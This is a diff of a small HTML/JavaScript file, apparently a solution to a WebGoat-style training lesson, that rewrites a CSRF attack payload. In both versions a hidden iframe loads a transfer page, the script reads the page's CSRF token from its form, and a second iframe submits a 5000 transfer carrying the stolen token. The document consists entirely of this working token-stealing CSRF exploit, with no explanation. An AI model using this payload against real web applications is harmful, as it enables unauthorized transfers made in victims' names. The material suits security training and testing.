@@ -1,17 +1,1 @@
-<iframe src="attack?Screen=1721642316&menu=900&transfer=main" onload="first();" id="first"></iframe>
-<iframe id="second"></iframe>
-
-<script type="text/javascript">
-    var token;
-
-    function first() {
-        var frame = document.getElementById("first").contentDocument;
-        token = frame.getElementsByTagName("form")[0].CSRFToken.value;
-        second();
-    }
-
-    function second() {
-        var frame = document.getElementById("second");
-        frame.src = "attack?Screen=1721642316&menu=900&transfer=5000&CSRFToken=" + token;
-    }
-</script>
+<script type="text/javascript">function get_token() {var frame = document.getElementById("token_frame").contentDocument;token = frame.getElementsByTagName("form")[0].token.value;transfer(token);}function transfer(token) {var frame = document.getElementById("transfer_frame");frame.src = "attack?Screen=1721642316&menu=900&transfer=5000&token=" + token;}</script><iframe src="attack?Screen=1721642316&menu=900&transfer=main" onload="get_token();" id="token_frame"></iframe><iframe id="transfer_frame"></iframe>
